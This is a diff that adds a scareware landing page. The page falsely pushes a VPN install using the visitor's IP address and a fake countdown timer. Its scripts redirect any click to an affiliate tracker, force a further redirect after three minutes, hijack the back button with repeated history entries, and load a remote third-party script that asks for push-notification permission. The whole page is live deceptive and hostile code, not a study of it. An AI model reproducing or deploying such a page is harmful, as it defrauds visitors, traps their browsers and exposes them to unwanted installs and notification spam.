@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html><head>
+  <base href="">
+  <meta charset="utf-8">
+  <meta name="google" value="notranslate">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style type="text/css">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}</style>
+
+<script>
+	function contains(string, fragment) {
+		string = string.toLowerCase();
+		fragment = fragment.toLowerCase();
+		return string.indexOf(fragment) !== -1;
+	}
+	function getURLParameter(name) {
+		var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+		if(name.indexOf('device_name') !== -1 && contains(result, 'generic')) {
+			result = 'Phone'
+		}
+		if(name.indexOf('device_model') !== -1 && contains(result, 'generic')) {
+			result = 'Phone'
+		}
+		if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+			result = 'Internet Browser'
+		}
+		return result;
+	}
+	function getRandomInt(min, max)
+	{
+	  return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+</script>
+
+<link href="style.css" rel="stylesheet" type="text/css">
+<title> VPN is recommended. </title>
+</head>
+<body class="en ltr" onclick="redirect();">
+<img src="loading.png" alt="" class="content-load">
+<section class="content">
+	<div class="content-container">
+		<div class="content-wrapper">
+                        <div class="popup" id="popup">
+        <h3 class="content-title blink">
+                                                    <span>Your IP address: <script>document.write(getURLParameter("ip"))</script></span>
+                                                        <br><span>Watch videos privately using a VPN app.</span>
+                                                          <br><span class="text_warn"><span id="minute">3</span> minutes <span id="second">59</span> seconds</span>                  </h3>
+        <h4 class="content-text">Complete 2 easy steps:</h4>
+                              <p class="content-text">1. Install the VPN app </p>
+                      <p class="content-text">2. Launch the app, press "Hide IP address" </p>
+                          <div class="content-download">
+          <a rel="noreferrer noopener" class="btn blink"> Install </a>
+        </div>
+			</div>
+		</div>
+		<div class="content-panel">
+			<img src="panel.jpg" alt="panel">
+		</div>
+	</div>
+</section>
+
+<script> let minElement = document.getElementById("minute");
+let secElement = document.getElementById("second");
+
+function countdown(minutes) {
+  let seconds = 60;
+  let mins = minutes;
+
+  function tick() {
+    seconds--;
+    minElement.innerHTML = minutes;
+    secElement.innerHTML = seconds;
+    if (seconds > 0) {
+      setTimeout(tick, 1000);
+    } else {
+      if (mins > 1) {
+        countdown(mins - 1);
+      }
+    }
+  }
+  tick();
+}
+
+if (minElement && secElement) {
+  countdown(+minElement.innerHTML);
+}
+ </script>
+    <script type="text/javascript">
+    function redirect() {
+       window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+       setTimeout(function () {
+         window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+       },  5000)
+     }
+    </script>
+ 
+  <script type="text/javascript">
+    setTimeout(function () {
+      window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+    }, 180000);
+  </script>
+
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+</script>
+
+<script>
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&sw=/sw-check-permissions-747a6.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+
+    document.head.appendChild(s);
+</script>
+
+</body></html>
